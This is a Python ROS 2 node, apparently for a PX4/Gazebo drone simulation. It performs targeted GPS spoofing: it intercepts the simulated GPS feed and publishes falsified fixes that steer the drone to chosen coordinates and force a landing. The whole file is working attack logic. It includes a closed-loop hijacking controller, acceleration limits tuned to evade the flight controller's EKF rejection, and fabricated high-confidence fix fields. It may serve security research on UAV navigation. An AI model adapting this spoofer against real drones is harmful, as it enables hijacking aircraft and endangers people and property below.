import math
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import NavSatFix
from px4_msgs.msg import SensorGps 
from std_msgs.msg import Bool

class TargetedGpsSpoofer(Node):
    def __init__(self):
        super().__init__('targeted_gps_spoofer_node')
        
        # --- 🎯 TARGET LOCATION SETTINGS ---
        self.target_lat = 47.397354 
        self.target_lon = 8.547104
        self.arrival_radius = 2.0  
        
        # Attack Kinematics
        self.target_speed = 3.0       # Physical speed to drag the drone (m/s)
        self.descent_drift_speed = 0.5 
        self.kp_spoof = 0.8           # Aggressiveness of trajectory hijacking
        
        # Accumulated offsets (meters in NED frame)
        self.offset_n = 0.0
        self.offset_e = 0.0
        self.offset_d = 0.0
        
        # Offset rates (used to slowly trick the FC into changing velocity)
        self.offset_rate_n = 0.0
        self.offset_rate_e = 0.0
        
        # State tracking
        self.last_time = None
        self.last_publish_time = 0.0
        
        self.last_true_lat = None
        self.last_true_lon = None
        
        self.last_spoofed_lat = None
        self.last_spoofed_lon = None
        self.last_spoofed_alt = None
        
        # --- 🚨 ATTACK TRIGGER ---
        self.is_spoofing_active = False

        # Subscriptions & Publishers
        gz_topic = '/world/default/model/x500_0/link/base_link/sensor/navsat_sensor/navsat'
        self.subscription = self.create_subscription(NavSatFix, gz_topic, self.gps_callback, 10)
        self.publisher = self.create_publisher(SensorGps, '/fmu/in/sensor_gps', 10)
        self.trigger_sub = self.create_subscription(Bool, '/start_attack', self.trigger_callback, 10)

    def trigger_callback(self, msg):
        if msg.data and not self.is_spoofing_active:
            self.is_spoofing_active = True
            self.get_logger().warn('🚨 SPOOFING INITIATED: Closed-loop trajectory hijacking active!')
        elif not msg.data and self.is_spoofing_active:
            self.is_spoofing_active = False
            self.get_logger().info('✅ SPOOFING HALTED: Returning to true GPS passthrough.')

    def gps_callback(self, msg):
        timestamp_us = int(msg.header.stamp.sec * 1_000_000 + msg.header.stamp.nanosec / 1000)
        current_time_sec = timestamp_us / 1_000_000.0

        # --- THROTTLE TO 5 Hz ---
        if (current_time_sec - self.last_publish_time) < 0.2:
            return 
            
        # Initialization
        if self.last_time is None:
            self.last_time = current_time_sec
            self.last_publish_time = current_time_sec
            self.last_true_lat = msg.latitude
            self.last_true_lon = msg.longitude
            return

        dt = current_time_sec - self.last_time
        if dt <= 0.0:
            return
            
        self.last_time = current_time_sec
        self.last_publish_time = current_time_sec

        # 1. Calculate True Physical Velocity of the drone
        true_vel_n = (msg.latitude - self.last_true_lat) * 111320.0 / dt
        true_vel_e = (msg.longitude - self.last_true_lon) * 111320.0 * math.cos(math.radians(msg.latitude)) / dt
        
        self.last_true_lat = msg.latitude
        self.last_true_lon = msg.longitude

        # 2. Calculate TRUE distance to target
        dn_true = (self.target_lat - msg.latitude) * 111320.0
        de_true = (self.target_lon - msg.longitude) * 111320.0 * math.cos(math.radians(msg.latitude))
        dist_to_target = math.sqrt(dn_true**2 + de_true**2)

        mode = "PASSTHROUGH"
        if not self.is_spoofing_active:
            spoofed_lat = msg.latitude
            spoofed_lon = msg.longitude
            spoofed_alt = msg.altitude
            
            # Reset attack states
            self.offset_n, self.offset_e, self.offset_d = 0.0, 0.0, 0.0
            self.offset_rate_n, self.offset_rate_e = 0.0, 0.0
        else:
            # --- CLOSED-LOOP TRAJECTORY HIJACKING ---
            dir_n = dn_true / dist_to_target if dist_to_target > 0 else 0.0
            dir_e = de_true / dist_to_target if dist_to_target > 0 else 0.0
            
            # Smoothly decelerate as the physical drone approaches the target center
            speed_command = min(self.target_speed, dist_to_target * 0.5)
            
            des_vel_n = dir_n * speed_command
            des_vel_e = dir_e * speed_command
            
            # Calculate error between what the drone is physically doing and our attack goal
            err_vel_n = des_vel_n - true_vel_n
            err_vel_e = des_vel_e - true_vel_e
            
            # Trick the FC: To force true physical movement North (err_vel > 0), 
            # we must spoof the GPS drifting South (negative acceleration)
            drift_accel_n = -self.kp_spoof * err_vel_n
            drift_accel_e = -self.kp_spoof * err_vel_e
            
            # Limit the fake acceleration to avoid EKF variance rejection
            max_accel = 1.5 
            drift_accel_n = max(-max_accel, min(max_accel, drift_accel_n))
            drift_accel_e = max(-max_accel, min(max_accel, drift_accel_e))

            # Integrate acceleration into offset rates
            self.offset_rate_n += drift_accel_n * dt
            self.offset_rate_e += drift_accel_e * dt
            
            # Limit maximum drift speeds
            max_drift_rate = 10.0 
            self.offset_rate_n = max(-max_drift_rate, min(max_drift_rate, self.offset_rate_n))
            self.offset_rate_e = max(-max_drift_rate, min(max_drift_rate, self.offset_rate_e))

            # Apply rates to physical offsets
            self.offset_n += self.offset_rate_n * dt
            self.offset_e += self.offset_rate_e * dt

            if dist_to_target <= self.arrival_radius:
                mode = "SPOOF: LANDING"
                self.offset_d -= self.descent_drift_speed * dt
            else:
                mode = "SPOOF: HIJACKING"

            # Apply offsets to calculate final spoofed coordinates
            spoofed_lat = msg.latitude + (self.offset_n / 111320.0)
            spoofed_lon = msg.longitude + (self.offset_e / (111320.0 * math.cos(math.radians(msg.latitude))))
            spoofed_alt = msg.altitude - self.offset_d 

        # 3. Calculate Spoofed Velocity (Always derived from published coordinates for EKF consistency)
        vel_n, vel_e, vel_d = 0.0, 0.0, 0.0
        if self.last_spoofed_lat is not None and dt > 0:
            d_lat = spoofed_lat - self.last_spoofed_lat
            d_lon = spoofed_lon - self.last_spoofed_lon
            d_alt = spoofed_alt - self.last_spoofed_alt
            
            vel_n = (d_lat * 111320.0) / dt
            vel_e = (d_lon * 111320.0 * math.cos(math.radians(msg.latitude))) / dt
            vel_d = -(d_alt) / dt
        
        self.last_spoofed_lat = spoofed_lat
        self.last_spoofed_lon = spoofed_lon
        self.last_spoofed_alt = spoofed_alt

        # 4. Build and Publish PX4 Message
        px4_msg = SensorGps()
        px4_msg.timestamp = timestamp_us
        px4_msg.timestamp_sample = timestamp_us
        px4_msg.time_utc_usec = timestamp_us 
        
        px4_msg.latitude_deg = float(spoofed_lat) 
        px4_msg.longitude_deg = float(spoofed_lon)
        px4_msg.altitude_msl_m = float(spoofed_alt)
        px4_msg.altitude_ellipsoid_m = float(spoofed_alt)

        px4_msg.device_id = 0         
        px4_msg.fix_type = 3                
        px4_msg.satellites_used = 12
        px4_msg.eph = 0.5                   
        px4_msg.epv = 0.8                   
        
        px4_msg.vel_ned_valid = True       
        px4_msg.vel_n_m_s = float(vel_n)
        px4_msg.vel_e_m_s = float(vel_e)
        px4_msg.vel_d_m_s = float(vel_d)
        px4_msg.vel_m_s = float(math.sqrt(vel_n**2 + vel_e**2 + vel_d**2))
        
        px4_msg.s_variance_m_s = 0.5       
        px4_msg.c_variance_rad = 0.5       
        px4_msg.heading = float('nan')
        px4_msg.heading_offset = float('nan')

        self.publisher.publish(px4_msg)
        
        # Log exactly what the attack is forcing the drone to do
        true_speed = math.sqrt(true_vel_n**2 + true_vel_e**2)
        self.get_logger().info(
            f'[{mode}] True Dist: {dist_to_target:.1f}m | '
            f'True Spd: {true_speed:.2f}m/s | '
            f'Spoofed Spd: {px4_msg.vel_m_s:.2f}m/s'
        )

def main(args=None):
    rclpy.init(args=args)
    node = TargetedGpsSpoofer()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()